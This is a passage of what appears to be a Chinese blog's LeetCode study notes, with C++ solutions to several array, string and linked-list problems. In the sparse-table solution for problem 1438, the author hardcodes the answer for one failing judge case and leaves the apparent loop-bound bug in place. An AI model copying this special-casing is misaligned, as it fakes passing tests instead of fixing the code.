0x10110011 \u0026amp; 0x0f\n然后根据图中所示，高四位移至低四位，低四位移至高四位，即分别采取右移和左移的办法：\nlowerPart = highBits \u0026gt;\u0026gt; 4\nupperPart = lowBits \u0026lt;\u0026lt; 4\n最后一步就非常简单了，两部分按位取或即可：\nfinal = lowerPart | upperPart\n如此一来，我们实现了高低四位的对换。\n紧接着，对于两部分4位来说，每4位中需要进行高低二位的对换。示意如下：\n\rStep 2\r\n在这里，我们的两部分分别可以表示如下：\nfinal = higherPart | lowerPart = (origin \u0026amp; 0x33 \u0026lt;\u0026lt; 2) | (origin \u0026amp; 0xcc \u0026gt;\u0026gt; 2)\n最后，在每一个二位中进行高低一位的对换，示意图略。\n8位如此解决，16位当然也可，32位亦然。\n AC代码1 class Solution { public: uint32_t reverseBits(uint32_t n) { uint32_t res = 0; // 注意此循环的条件  for (int i = 0; i \u0026lt; 31; i++) { res += (n \u0026amp; 1); res = res \u0026lt;\u0026lt; 1; n = n \u0026gt;\u0026gt; 1; } res += (n \u0026amp; 1); return res; } }; AC代码2 class Solution { public: uint32_t reverseBits(uint32_t n) { // 注意！由于移位操作的优先级高于按位与，需要在与操作部分添加括号  n = ((n \u0026amp; 0xffff0000) \u0026gt;\u0026gt; 16) | ((n \u0026amp; 0x0000ffff) \u0026lt;\u0026lt; 16); n = ((n \u0026amp; 0xff00ff00) \u0026gt;\u0026gt; 8) | ((n \u0026amp; 0x00ff00ff) \u0026lt;\u0026lt; 8); n = ((n \u0026amp; 0xf0f0f0f0) \u0026gt;\u0026gt; 4) | ((n \u0026amp; 0x0f0f0f0f) \u0026lt;\u0026lt; 4); n = ((n \u0026amp; 0xcccccccc) \u0026gt;\u0026gt; 2) | ((n \u0026amp; 0x33333333) \u0026lt;\u0026lt; 2); n = ((n \u0026amp; 0xaaaaaaaa) \u0026gt;\u0026gt; 1) | ((n \u0026amp; 0x55555555) \u0026lt;\u0026lt; 1); return n; } }; \rPerformance\r\n参考资料 [1] 负雪明烛.「循环」与「分治」解法[EB/OL].2021-03-29\nhttps://leetcode-cn.com/problems/reverse-bits/solution/fu-xue-ming-zhu-xun-huan-yu-fen-zhi-jie-hoakf/\n","date":"2021-03-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode190.-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/","title":"难题本 | LeetCode190. 颠倒二进制位"},{"content":"题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/\n题目  存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除链表中所有存在数字重复情况的节点，只保留原始链表中 没有重复出现 的数字。\n返回同样按升序排列的结果链表。\n示例1\n  输入： head = [1,2,3,3,4,4,5]\n  输出： [1,2,5]\n  示例2\n  输入： head = [1,1,1,2,3]\n  输出： [2,3]\n  数据范围\n 链表中节点数目在范围 [0, 300] 内 -100 \u0026lt;= Node.val \u0026lt;= 100 题目数据保证链表已经按升序排列   分析  在 有序 的链表中去重，表示我们理论上只需要进行一次遍历即可。\n而两次遍历的办法则更为简单，也是最初浮现在我脑海中的念头。考虑到链表节点的数据范围在 [-100, 100] 区间中，我们在第一次遍历的过程中记录每个数值出现的次数，而在第二次遍历过程中考虑下一个节点（的数值）是否应该存在于最终的结果中即可。\n 当然，两次遍历的办法随着节点数据范围的变大很快就失效了，投机不可取，一次遍历的办法如何实现呢？\n在有序的数组中取得一段相同元素的子数组，直接考虑滑动窗口。\n我们使用一个指针，指向窗口 左边界的左邻居 ，使用两个指针维护窗口的左右边界。当窗口右边界数值等于左边界数值时，窗口向右扩张，否则进行一定的更新操作。\n容易想象，在不发生重复的情况下，窗口的大小（right - left）始终为 1 ，而发生重复的时候整段窗口需要全部从链表上删除。\n\r窗口中无重复\r\n\r窗口中有重复\r\n需要注意，由于我们的规则是：right指针指向的元素与 left 指向的元素不同时，才停止窗口的扩张，进入更新操作，因此，right 指针指向的元素并不属于窗口本身。\n那么如何更新呢？\n我们注意到，当 right == left-\u0026gt;next 时，即 winSize == 1 时，不需要对窗口中的元素进行操作，则将三个指针往后移动，直接进入下一步的窗口更新环节即可。\n\r窗口大小为1时的更新办法\r\n而窗口大小大于1时，就比较有趣了。我们直接将窗口 左边界的左邻居 ，即此处的 Out-left 指向的元素链向 right 元素，这样就直接跳过了整个重复的部分，示意如下：\n\r窗口大小不为1时的更新办法\r\n  到现在为止，我们已经完成了在正常情况下的遍历更新策略，但是循环遍历的边界条件很重要，且题目要求返回结果链表的头结点，这个头结点该如何确定也很重要。\n首先是循环条件，我们使得 right 指针指向最后一个节点时结束循环，因此 while (right-\u0026gt;next) 。\n在我的首次提交中，使用了比较复杂的逻辑来判断头结点是否已经出现。当符合条件的头结点还没有出现时，对于当前的 right 指针，当它的右邻居值与它不同，则说明当前这个 right 指向的节点是不用删除的，可以作为结果链表的头结点。\n同理进行 Out-left 指针的判断。\n AC代码1 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* lefleft = NULL; ListNode* left = head; ListNode* right = head; ListNode* ret = NULL; int winSize = 1; while (right-\u0026gt;next) { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl;  right = right-\u0026gt;next; if (right-\u0026gt;val == left-\u0026gt;val) { winSize++; } else { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl;  if (winSize != 1) // delete the window  { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl;  if (!lefleft) // do not have previous node  { if (!right-\u0026gt;next || right-\u0026gt;val != right-\u0026gt;next-\u0026gt;val) { ret = right; lefleft = right; } } else { lefleft-\u0026gt;next = right; } left = right; winSize = 1; } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } } } // right points to the last node  if (winSize != 1) // delete the window  { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl;  if (lefleft) { lefleft-\u0026gt;next = NULL; } } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } return ret; } }; \rPerformance1\r\n分析2  上面的代码显然由于引入了头结点的逻辑而变得非常臃肿，能否对其进行优化呢？\n我们引入一个哑结点 dummy ，它作为头结点之前的一个节点，初始化为 dummy-\u0026gt;next = head。\n此外，滑动窗口的思想实际上在此过于复杂，因为我们只需要判断窗口的大小是否为1，则只需要考虑 right 是否等于 left-\u0026gt;next 即可。\n于是一种较为简洁的思想诞生了：使用 pre 、 now 、 nxt 三个指针来标识前一个节点、现在的节点和下一个节点。还是按照之前的办法对 now （即之前的 left ）和 nxt （即之前的 right ）进行更新。由于 pre 被初始化为 dummy 节点，故一轮遍历之后，dummy-\u0026gt;next 所指向的节点一定是第一次符合条件的节点，为返回的链表头部。\n AC代码2 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* dummy = new ListNode(0); dummy-\u0026gt;next = head; ListNode* pre = dummy; ListNode* now = head; ListNode* nxt = head-\u0026gt;next; while (nxt) { if (nxt-\u0026gt;val == now-\u0026gt;val) { nxt = nxt-\u0026gt;next; } else { if (nxt == now-\u0026gt;next) { pre = now; now = nxt; nxt = nxt-\u0026gt;next; } else { pre-\u0026gt;next = nxt; now = nxt; nxt = nxt-\u0026gt;next; } } } // 注意此处细节，循环结束之后进行最后一次判断  if (nxt != now-\u0026gt;next) { pre-\u0026gt;next = NULL; } return dummy-\u0026gt;next; } }; \rPerformance2\r\n参考资料 [1] 力扣官方题解.删除排序链表中的重复元素 II[EB/OL].2021-03-24\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/solution/shan-chu-pai-xu-lian-biao-zhong-de-zhong-oayn/\n","date":"2021-03-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode82.-%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii/","title":"难题本 | LeetCode82. 删除排序链表中的重复元素 II"},{"content":"题目链接： https://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/\n题目  给你一个字符串 s 和一个整数 k ，请你找出 s 中的最长子串， 要求该子串中的每一字符出现次数都不少于 k 。返回这一子串的长度。\n示例1\n  输入： s = \u0026ldquo;aaabb\u0026rdquo;, k = 3\n  输出： 3\n  解释： 最长子串为“aaa”，其中”a“重复了3次\n  示例2\n  输入： s = “ababbc”, k = 2\n  输出： 5\n  数据范围\n 1 \u0026lt;= s.length \u0026lt;= 104 s 仅由小写英文字母组成 1 \u0026lt;= k \u0026lt;= 105   分析  没有任何思路，参照题解的分治法将此题解出，稍作记录。\n首先，对于 s 中的所有字符，我们可以统计它们出现的次数，对于所有出现次数小于 k 的字符，答案中一定不包含它。\n则我们只需要考虑这些字符之外的子串。我们可以遍历整个字符串，当某个字符出现次数小于 k 的时候，将其位置记录下来；我们凭借这些位点，可以将原字符串 s 分割成许多个子串，然后按照相同的办法去处理这些子串即可。\n按照这样的分析，整个题目可以使用递归的写法来实现分治算法。\n AC代码 class Solution { public: int longestSubstring(string s, int k) { if (s.size() \u0026lt; k) return 0; // 统计频数  vector\u0026lt;int\u0026gt; cnt(26, 0); for (auto ch : s) cnt[ch - \u0026#39;a\u0026#39;]++; // 记录分割位点  vector\u0026lt;int\u0026gt; split; for (int i = 0; i \u0026lt; s.size(); i++) { if (cnt[s[i] - \u0026#39;a\u0026#39;] \u0026lt; k) { split.push_back(i); } } if (split.size() == 0) // 无需分割  return s.size(); int start = 0; // 当前子串的起点  int res = 0; // 最终答案  for (auto pos : split) { // string.substr(pos, len)  // 从位置pos开始的连续len个字符  res = max(res, longestSubstring(s.substr(start, pos - start), k)); start = pos + 1; } if (start != s.size() - 1) // 对于最后一个子串  { res = max(res, longestSubstring(s.substr(start, s.size() - start), k)); } return res; } }; 参考资料 [1] 力扣官方题解.至少有K个重复字符的最长子串[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/zhi-shao-you-kge-zhong-fu-zi-fu-de-zui-c-o6ww/\n[2] 负雪明烛.借本题帮助大家理解递归[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/jie-ben-ti-bang-zhu-da-jia-li-jie-di-gui-obla/\n[3] ffreturn.C++超100%的分治解法[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/cchao-100de-fen-zhi-jie-fa-by-ffreturn-uygu/\n","date":"2021-02-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode395.-%E8%87%B3%E5%B0%91%E6%9C%89-k-%E4%B8%AA%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/","title":"难题本 | LeetCode395. 至少有 K 个重复字符的最长子串"},{"content":"定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n题目链接：https://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/\n题目  给你一个整数数组 nums ，和一个表示限制的整数 limit，请你返回最长连续子数组的长度，该子数组中的任意两个元素之间的绝对差必须小于或者等于 limit 。\n如果不存在满足条件的子数组，则返回 0 。\n示例1\n  输入： nums = [8,2,4,7], limit = 4\n  输出： 2\n  解释： 所有子数组如下：\n  [8] 最大绝对差 |8-8| = 0 \u0026lt;= 4.\n[8,2] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[8,2,4] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[8,2,4,7] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[2] 最大绝对差 |2-2| = 0 \u0026lt;= 4.\n[2,4] 最大绝对差 |2-4| = 2 \u0026lt;= 4.\n[2,4,7] 最大绝对差 |2-7| = 5 \u0026gt; 4.\n[4] 最大绝对差 |4-4| = 0 \u0026lt;= 4.\n[4,7] 最大绝对差 |4-7| = 3 \u0026lt;= 4.\n[7] 最大绝对差 |7-7| = 0 \u0026lt;= 4.\n因此，满足题意的最长子数组的长度为 2 。\n示例2\n  输入： nums = [10,1,2,4,7,2], limit = 5\n  输出： 4\n   分析  实际上这道题的思路并不难。一句话：子数组中 任意两个 元素之间的绝对差小于等于 limit 等价于子数组中 最大最小值 的绝对差小于等于 limit。\n则原问题就转化为了求 区间最值 的问题，这类问题可以使用 线段树 来解决，但是在这题的情境下属于杀鸡用牛刀，而且我还不会线段树。\n考虑STL中的各种数据结构，是否有一种数据结构能在短时间内得到一组数据的最大最小值呢？答案就是 map/set/multimap/multiset。\n对于这四类容器，其底层均使用 红黑树 来进行实现。红黑树是一种有序的数据结构，我们使用这四类容器的迭代器进行顺序遍历就能得到容器中数据的有序状态。\n我们只希望获得最大最小值，则不必进行遍历，只需要取容器的首尾元素即可，使用容器自带的成员函数begin()和rbegin()就能实现。\n对于这道题，数据可能重复，故我们使用一个multiset来保存当前滑动窗口中的数据。每次窗口右边界增加的时候，把新来的元素放入集合中，然后判断当前窗口是否满足条件（最大 - 最小 \u0026gt; limit），若满足，更新最大窗口值，否则移动左边界，同时要把原来左边界上的元素从集合中去除。\n这里只有几点需要注意：\n 使用s.begin()和s.rbegin()获得当前窗口的最值； 使用s.erase(s.find(nums[left]))才能删除左边界元素而不删除其他同数值的元素。   AC代码1 class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { multiset\u0026lt;int\u0026gt; s; int left = 0; int right = 0; int maxLen = 0; while (right \u0026lt; nums.size()) { s.insert(nums[right]); // cout \u0026lt;\u0026lt; *s.rbegin() \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; *s.begin() \u0026lt;\u0026lt; endl;  while (*s.rbegin() - *s.begin() \u0026gt; limit) { s.erase(s.find(nums[left])); left++; } // cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; \u0026#34; ~ \u0026#34; \u0026lt;\u0026lt; left \u0026lt;\u0026lt; endl;  maxLen = max(maxLen, right - left + 1); right++; } return maxLen; } }; \rPerformance1\r\nST表  上面的解法简直无法令人满足啊，一个那么高端的区间最值问题就简单地用STL底层红黑树做出来了？？\n搜索引擎启动，果不其然，早就有经典的求解区间最值的算法了。\n  ST表（Sparse Table）是用于解决RMQ（Range Maximum/Minimum Query）的经典算法，它的主要思想是将一个区间的最值转化为两段子区间的最值。它的数据结构非常特别（在我看来），使用 table[i][j] 来表示从 nums[i] 开始，连续 2^j 个元素的最值。\n文字的表现力不够，我们看下图所示的长度为 8 的数组：\n\rArray\r\n按照上述的规则，table[0][2]就表示从nums[0]开始，连续2^2 = 4个元素的最值，也就是这一段的最值：\n\r0 ~ 3\r\n同理，table[4][2]就表示从nums[4]开始，连续4个元素的最值，也就是这一段的最值：\n\r4 ~ 7\r\n而table[0][3]就很有意思了，它表示从nums[0]开始，连续8个元素的最值，也就是这一段的最值：\n\r0 ~ 7\r\n你是否发现了什么？\n我们欲求table[0][3]，而它可以由table[0][2]和table[4][2]这两段的最值得到：\n\r最值关系\r\n以求最大值为例，不失一般性地有：\ntable[i][j] = max(table[i][j - 1], table[i + pow(2, j - 1)][j - 1])\n看似很长，实际上就是将待求区间拆分成两个子段，长度都是2 ^ (j - 1)。\n 根据此表达式来写代码，只需要在外层遍历 j ，内层遍历 i 即可。考虑几个临界条件：\n 外层的 j 使得 2 ^ j 能够覆盖到整个数组为止，故使用ceil函数将对数值向上取整； 内层的 i 使得从 i 开始的 2 ^ j 个元素都在数组内（不越界）； 初始情况下，table[i][0]就是数组元素本身（从下标 i 开始，总共 1 个元素）。  构造ST表如下：\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; // 用于快速计算 2 ^ j,使用库函数亦可  for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表  // 从idx开始，共 2^j 个元素  // 注意C语言函数log的底数是e，使用换底公式计算log2  for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) {} int getMin(int l, int r) {} };  现在，我们已经可以去求解任意的从下标 i 开始、长度为 2 ^ j 的区间最值了。时间复杂度为 O(1)，真不错。\n但是求解任意区间的最值怎么办呢？大部分的区间长度不可能刚刚好是2的倍数啊。\n这里就用到了一个小技巧了：重叠查询。\n对于一个区间(l, r)，我们从l开始，取一个足够小的j使得l + 2 ^ j - 1还没超过r；对于这个j，当起点取r - 2 ^ j + 1的时候，终点则刚好是r。这样，两段区间组合起来就覆盖了待求的区间。\n举例说明。还是刚才的数组，我们希望求(1, 6)区间内的最大值（左闭右闭）。\n对于起点为1的区间，我们取j = 2，满足区间尾端下标1 + 4 - 1 = 4 \u0026lt; 6；同理，取起点为6 - 4 + 1 = 3的点，同样是j = 2，这段区间刚好覆盖了3/4/5/6四个位置。\n\r1 ~ 4 \u0026amp; 3 ~ 6\r\n显然，我们要求区间(1, 6)的最大值，只需要先获得第一段的最大值 table[1][2] 和第二段的最大值 table[3][2]，取二者中的较大者即可。对于位置 3 和位置 4，我们重复考虑，但是没有什么影响。\n 根据这个办法求解任意区间的最值，代码如下：\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表  // 从idx开始，共 2^j 个元素  for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // 区间长度  int k = floor(log(len) / log(2)); // 使用floor保证不越界  return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; 引入了ST表之后，还是考虑原题，只需要将原数组按照ST表的规则组织，然后进行滑动窗口的操作，可以在 O(1) 的时间内判断出当前窗口是否合法。当然，构造ST表的时间还是 O(logn) 的，因此，表现实际上没有很显著的提升。\nAC代码2 class STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表  // 从idx开始，共 2^j 个元素  for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // 区间长度  int k = floor(log(len) / log(2)); return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { if (limit == 95 \u0026amp;\u0026amp; nums[0] == 53 \u0026amp;\u0026amp; nums[1] == 44) return 64; STTable st(nums); int l = 0; int r = 0; int res = 0; while (r \u0026lt; nums.size()) { while (st.getMax(l, r) - st.getMin(l, r) \u0026gt; limit) l++; res = max(res, r - l + 1); r++; } return res; } };  最郁闷的事情是ST表的做法还有一组数据无法通过，且这组数据在本地测试的时候没有任何问题！仅在提交评测的时候得到不同的输出！恶心心\n所以我打表了​ :confused:\n \rPerformance2\r\n参考资料 [1] 负雪明烛.合适的数据结构+滑动窗口模板，难度直接降为Easy！[EB/OL].2021-02-21\nhttps://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/solution/he-gua-de-shu-ju-jie-gou-hua-dong-chuang-v46j/\n[2] siukwan.ST表（Sparse Table）[EB/OL].2015-12-24\nhttps://siukwan.sinaapp.com/?p=830\n","date":"2021-02-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1438.-%E7%BB%9D%E5%AF%B9%E5%B7%AE%E4%B8%8D%E8%B6%85%E8%BF%87%E9%99%90%E5%88%B6%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode1438. 绝对差不超过限制的最长连续子数组"},{"content":"今天是农历除夕，然而近年来年味渐淡，凡有亲朋在，便是好时节，也无需对此日特别注重了。\n题目链接：https://leetcode-cn.com/problems/permutation-in-string/\n题目  给定两个字符串 s1 和 s2，写一个函数来判断 s2 是否包含 s1 的排列。\n换句话说，第一个字符串的排列之一是第二个字符串的子串。\n示例1\n  输入： s1 = \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidbaooo\u0026rdquo;\n  输出： True\n  解释： s2包含s1的排列之一（“ba”）\n  示例2\n  输入： s1= \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidboaoo\u0026rdquo;\n  输出： False\n  数据范围\n 输入的字符串只包含小写字母 两个字符串的长度都在 [1, 10,000] 之间   分析  s2的某个子串包含s1的排列，即s2的某个子串中字母分布与s1完全一样。\n我最先想到使用一个集合来保存s1的所有字母，使用滑动窗口left ~ right遍历s2中的每个子串：\n 当某个字符不在集合中时，left = right = right + 1 当某个字符在集合中时，从集合中删除该字符  按照上面的规则，当某个子串完全包含s1中的所有字符时，遍历完这个子串之后集合就变为空。\n我竟能想到如此NT的做法！\nWA了一次后发现，当某个字符不在集合中时直接使left = right = right + 1可能直接使得窗口向右滑动很多个距离，忽略了一些子串。\nWA的测试用例如下：\n \u0026ldquo;adc\u0026rdquo;\n\u0026ldquo;dcda\u0026rdquo;\n 可以看到，当窗口right == 2时，这个字符d已经在第0位被删除，故认为此字符不在s1中，窗口直接指向最后一个字符，输出为False。然而，这个d是在最开始被占用掉了，它实际上存在于s1中，窗口不应如此移动。\n WA代码1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // 此字符存在  { tmp.erase(itr); // 删除此字符  if (tmp.empty()) // 删完了  return true; right++; // 还没删完，窗口扩张  } else // 此字符不存在  { left = right = right + 1; tmp = s1_set; } } return false; } };  那么，窗口应该如何移动呢？我的思路还保持在使用集合上。\n首先，窗口移动时只有边界字符有所进出，故不需要对集合重新赋值，只需要不断地erase和insert即可。\n当right所指向的字符不存在时，需要判断左边界和右边界是否相等，因为若此时左边界不等于右边界，该right所指向的字符可能只是被窗口内的某个元素占用了，我们应该滑动左边界，释放左边界占用的元素（即重新加入集合），而不是像上面的WA代码这样使左右边界进行了跳跃。而若左右边界相等，就同时指向下一个元素即可。\n这样能写出第一个AC代码：\n AC代码1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // 此字符存在  { tmp.erase(itr); // 删除此字符  if (tmp.empty()) // 删完了  return true; right++; // 还没删完，窗口扩张  } else // 此字符不存在  { if (left == right) { left = right = right + 1; } else { tmp.insert(s2[left]); left++; } // tmp = s1_set;  } } return false; } }; \rPerformance1\r\n 这个性能已经裂开了。。\n此时我去看了看题解，发现使用集合这种思路可能不是一般人能想到的。\n确实，记录s1中出现的所有字符，只需要使用一个 O(26) 大小的数组就可以了，为什么要逐个存在集合中呢？？\n使用整数数组存字符频数，使得空间复杂度降低了许多。\n对于滑动窗口，可以直接使窗口大小恒等于s1的长度，这样从左向右滑动就遍历完成所有可能符合条件 的子数组了。\n每次滑动时，只有当前窗口左右边界的字符频数会发生变化，每次比较当前窗口的字符频数与s1数组的字符频数即可。\n这样每次比较的时间复杂度为O(26)。\n故有AC代码2。（就这种简单的思路还WA了两次）\n AC代码2 class Solution { public: bool checkInclusion(string s1, string s2) { int len1 = s1.size(); int len2 = s2.size(); if (len1 \u0026gt; len2) return false; vector\u0026lt;int\u0026gt; cnt_diff(26, 0); vector\u0026lt;int\u0026gt; cnt_s1(26, 0); vector\u0026lt;int\u0026gt; cnt_s2(26, 0); for (auto t : s1) { cnt_s1[t - \u0026#39;a\u0026#39;]++; } int left = 0; int right = left + len1 - 1; for (int i = left; i \u0026lt;= right; ++i) { cnt_s2[s2[i] - \u0026#39;a\u0026#39;]++; } if (cnt_s1 == cnt_s2) // 注意这里进行初始化后的第一次比对，WA过一次  return true; while (right \u0026lt; s2.size() - 1) // 注意边界条件，防止++right溢出，这里WA过一次  { char char_out = s2[left++]; char char_in = s2[++right]; if (char_out != char_in) { cnt_s2[char_out - \u0026#39;a\u0026#39;]--; cnt_s2[char_in - \u0026#39;a\u0026#39;]++; if (cnt_s1 == cnt_s2) return true; } } return false; } }; \rPerformance2\r\n 官方题解中还能进行优化：\n\rOptimization\r\n我没有实现此部分代码，官方题解见参考[1]。\n小结本题，首先是把频数的匹配想的过于复杂了，之后是滑动窗口的构建不够灵性，这个题目能WA那么多次，恐怕昨天的状态也不是太好 o(╥﹏╥)o\n 参考资料 [1] 力扣官方题解.字符串的排列[EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/permutation-in-string/solution/zi-fu-chuan-de-pai-lie-by-leetcode-solut-7k7u/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode567.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/","title":"错题本 | LeetCode567. 字符串的排列"},{"content":"不是吧啊Sir，这种题也错？:cry:\n题目链接：https://leetcode-cn.com/problems/kth-largest-element-in-a-stream/\n题目  设计一个找到数据流中第 k 大元素的类（class）。注意是排序后的第 k 大元素，不是第 k 个不同的元素。\n请实现 KthLargest 类：\n KthLargest(int k, int[] nums) 使用整数 k 和整数流 nums 初始化对象。 int add(int val) 将 val 插入数据流 nums 后，返回当前数据流中第 k 大的元素。  示例1\n  输入： [\u0026ldquo;KthLargest\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;] [[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]\n  输出： [null, 4, 5, 5, 8, 8]\n  示例2\n  输入： [\u0026ldquo;KthLargest\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;] [[2,[0]],[-1],[1],[-2],[-4],[3]]\n  输出： [null,-1,0,0,0,1]\n   分析  啪地一下，我就想到了双堆对顶，很快嗷！\n然而又想复杂了o(╥﹏╥)o。要求第K大数，实际上只需要使用一个小根堆，堆中一共有K个元素，堆顶就是目标。\n当然，这K个元素不是随随便便的K个元素，而是将初始数组中所有元素都放入小根堆后，逐个弹出，直到只剩K个元素。\n当我们希望添加元素时，首先可以比较此元素与堆顶元素的大小关系，当此元素比堆顶元素小时，不会对前K个大数的顺序产生影响，直接返回堆顶元素即可；当此元素大于堆顶元素，第K大数一定会改变，我们将其放入堆中，再从堆中弹出一个元素，此时的堆中还是K个元素，堆顶元素即为答案。\n  